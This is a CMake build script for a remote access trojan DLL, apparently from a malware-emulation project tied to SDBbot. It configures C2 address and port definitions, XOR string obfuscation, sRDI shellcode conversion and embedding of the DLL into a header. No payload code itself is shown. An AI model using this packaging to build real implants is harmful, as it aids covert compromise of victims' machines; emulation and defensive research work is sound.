# RAT DLL
add_library(rat SHARED)
set_target_properties(rat PROPERTIES OUTPUT_NAME_RELEASE ${RAT_HOST_DLL})

target_link_libraries(rat PRIVATE common)
target_link_options(rat PRIVATE /guard:cf)
target_include_directories(rat PUBLIC "${CMAKE_SOURCE_DIR}/include")

target_sources(
    rat
    PRIVATE
    "main.cpp"
    "comms.cpp"
    "core.cpp"
    "settings.cpp"
    "utilities.cpp"
    PUBLIC
    FILE_SET rat_headers
    TYPE HEADERS
    FILES
    "comms.hpp"
    "json.hpp"
    "core.hpp"
    "net.hpp"
    "settings.hpp"
    "utilities.hpp"
    "xor_string.hpp"
 )

include(srdi)
add_srdi_target(rat-srdi rat run)

# C2/Packet definitions
 target_compile_definitions(
    rat PRIVATE
    RAT_C2_IP_ADDRESS="${RAT_C2_IP_ADDRESS}"
    RAT_C2_PORT="${RAT_C2_PORT}"
    RAT_PACKET_HEADER="${RAT_PACKET_HEADER}"
    RAT_ENCRYPT_COMMS="${RAT_ENCRYPT_COMMS}"
    $<$<CONFIG:Debug>:DEBUG>
)

add_custom_command(
    OUTPUT "$<CONFIG>/rat.dll.hpp"
    COMMAND $<OUTPUT_CONFIG:$<TARGET_FILE:bin2h>> $<TARGET_FILE:rat> ${CMAKE_SOURCE_DIR}/src/rat/rat.dll.hpp.in $<CONFIG>/rat.dll.hpp
    DEPENDS "$<TARGET_FILE:rat>"
    COMMENT "Generating header with embedded rat"
)

add_library(rat-header INTERFACE)

target_sources(
    rat-header
    PUBLIC
        FILE_SET
            rat_header
        TYPE    
            HEADERS
        BASE_DIRS
            "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>"
        FILES
            "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/rat.dll.hpp"
)

# Add unit test .cpp files here
target_sources(
    sdbbot-test
    PRIVATE
    "comms_test.cpp"
    "core_test.cpp"
    "utilities_test.cpp"
    $<FILTER:$<TARGET_OBJECTS:rat>,EXCLUDE,main.cpp.obj>
    PRIVATE
    FILE_SET rat_headers
    TYPE HEADERS
)